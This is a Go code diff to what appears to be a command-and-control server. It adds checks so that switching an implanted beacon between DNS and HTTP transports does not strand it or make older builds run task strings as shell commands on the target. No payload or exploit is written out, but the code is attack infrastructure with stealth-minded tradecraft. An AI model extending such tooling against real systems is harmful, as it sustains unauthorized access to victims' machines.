@@ -271,6 +271,22 @@ func (api *APIServer) handleSetBeaconHTTPListeners(w http.ResponseWriter, r *htt
 		return
 	}
 
+	// Switching to DNS-only on a beacon that has no active DNS domain leaves it
+	// with no transport at all: the task tells it to stop using HTTP, and there is
+	// nothing to poll. Refuse instead of silently stranding it.
+	if mode == "dns" {
+		domains, err := api.db.GetActiveBeaconDomains(beaconID)
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, "failed to read the beacon's DNS domains")
+			return
+		}
+		if len(domains) == 0 {
+			api.sendError(w, http.StatusConflict,
+				"this beacon has no active DNS domain; switching it to DNS-only would leave it unreachable")
+			return
+		}
+	}
+
 	listeners, err := api.httpListenerSpecs(req.Names)
 	if err != nil {
 		api.sendError(w, http.StatusBadRequest, err.Error())
@@ -286,8 +302,26 @@ func (api *APIServer) handleSetBeaconHTTPListeners(w http.ResponseWriter, r *htt
 	// Hand the beacon a URL and a single-use token, not the profile itself. On DNS
 	// the full document is hundreds of label-sized chunks; the short form is one
 	// or two, and the profile arrives over the HTTP listener it describes.
+	//
+	// Only a build that understands the short form may receive it: an older beacon
+	// treats any unknown task as a shell command and would run the task string.
 	delivered := ""
-	if mode != "dns" && len(listeners) > 0 {
+	shortFormOK := mode != "dns" && len(listeners) > 0 && api.beaconSupportsHTTPBootstrap(beaconID)
+	if shortFormOK {
+		// The bootstrap URL is only meaningful if a listener actually serves this
+		// profile: a stored profile nobody assigned answers 404, and the beacon would
+		// spend its token on nothing.
+		if _, ok := api.db.ServerServingHTTPProfile(listeners[0].Name); !ok {
+			api.sendError(w, http.StatusConflict,
+				"profile "+listeners[0].Name+" is not assigned to any listener; assign it on the HTTP Listeners page first")
+			return
+		} else if listeners[0].Host == "" {
+			api.sendError(w, http.StatusConflict,
+				"profile "+listeners[0].Name+" has no beacon_host set; the beacon has no address to fetch it from")
+			return
+		}
+	}
+	if shortFormOK {
 		bootstrapURL := api.bootstrapURLForListener(listeners[0])
 		if bootstrapURL == "" {
 			api.sendError(w, http.StatusBadRequest, "the selected profile has no reachable bootstrap endpoint")
@@ -305,7 +339,9 @@ func (api *APIServer) handleSetBeaconHTTPListeners(w http.ResponseWriter, r *htt
 		}
 		delivered = short
 	} else {
-		// DNS mode carries no listener: the full payload is short by definition.
+		// Either DNS mode (which carries no listener, so the payload is short by
+		// definition) or a build that predates the bootstrap hand-off: both take the
+		// full payload, which those beacons already understand.
 		if err := api.queueTransportUpdate(beaconID, payload); err != nil {
 			api.sendError(w, http.StatusInternalServerError, err.Error())
 			return
@@ -439,4 +475,23 @@ func bootstrapPathFromURIs(uris map[string][]string) string {
 		}
 	}
 	return ""
+}
+
+// beaconSupportsHTTPBootstrap reports whether this beacon's build understands the
+// short http_profile: task.
+//
+// Unknown answers false on purpose: sending the short form to a build that does
+// not parse it turns a transport update into a shell command execution on the
+// target, which is both useless and noisy.
+func (api *APIServer) beaconSupportsHTTPBootstrap(beaconID string) bool {
+	beacon, err := api.db.GetBeacon(beaconID)
+	if err != nil || beacon.BuildID == "" {
+		return false
+	}
+	config, err := api.db.GetBuildConfigByBuildID(beacon.BuildID)
+	if err != nil || config.BinaryID == "" {
+		return false
+	}
+	supported, _ := config.Extra["http_bootstrap"].(bool)
+	return supported
 }
